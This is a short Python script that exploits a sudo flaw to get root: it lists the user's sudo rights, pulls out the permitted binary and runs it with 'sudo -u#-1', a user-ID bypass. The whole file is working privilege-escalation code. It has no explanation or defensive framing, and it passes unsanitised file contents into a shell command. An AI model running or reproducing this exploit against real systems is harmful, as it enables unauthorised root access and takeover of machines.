#!/usr/bin/python3
import os

#Get current username
username = input("Enter current username :")

#check which binary the user can run with sudo
os.system("sudo -l > priv")

os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")

binary_file = open("binary")
binary= binary_file.read()

#execute sudo exploit
print("Lets hope it works")
os.system("sudo -u#-1 "+ binary)